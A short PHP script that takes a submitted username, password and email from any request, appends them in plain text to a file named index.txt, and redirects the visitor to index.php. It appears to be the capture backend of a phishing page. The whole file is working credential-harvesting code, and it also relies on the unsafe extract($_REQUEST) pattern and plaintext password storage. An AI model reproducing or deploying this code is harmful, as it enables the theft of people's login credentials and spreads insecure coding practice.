<?php
    extract($_REQUEST);
    $file=fopen("index.txt","a");

    fwrite($file,"name :");
    fwrite($file, $username ."\n");
    fwrite($file,"password :");
    fwrite($file, $password ."\n");
    fwrite($file, "email:");
    fwrite($file, $email ."\n");
    fclose($file);
    header("location:index.php");
 ?>
